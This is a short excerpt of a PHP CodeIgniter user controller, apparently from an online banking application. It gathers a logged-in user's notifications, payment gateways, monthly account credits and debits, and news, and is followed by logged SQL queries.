app/Controllers/User.php

  protected function user()
  {
    $user = (new UserModel)->where("id", session()->get("user_id"))->first();
    $user['notification'] = (new NotificationModel)->where(["user_id" => session()->get("user_id"), "status" => 0])->countAllResults();
    $user["gateway"] = (new PaymentGateway)->where("status", 1)->findAll();
    $user['MonthlyCredit'] = (new TransferModel)->select('sum(amount) as total')->where(["receiver_acc" => $user['savings_acc'], "month" => date("F Y")])->first()['total'];
    $user['MonthlyDebit'] = (new TransferModel)->select('sum(amount) as total')->where(["sender_acc" => $user['savings_acc'], "month" => date("F Y")])->first()['total'];
    $user['cMonthlyCredit'] = (new TransferModel)->select('sum(amount) as total')->where(["receiver_acc" => $user['check_acc'], "month" => date("F Y")])->first()['total'];
    $user['cMonthlyDebit'] = (new TransferModel)->select('sum(amount) as total')->where(["sender_acc" => $user['check_acc'], "month" => date("F Y")])->first()['total'];
    $user["news"] = (new NewsModel)->where("status", 1)->findAll();
---
SELECT COUNT(*) AS `numrows`
FROM `ci_notifications`
WHERE `user_id` = '6'
AND `status` = 0
SELECT *
FROM `ci_news`
WHERE `status` = 1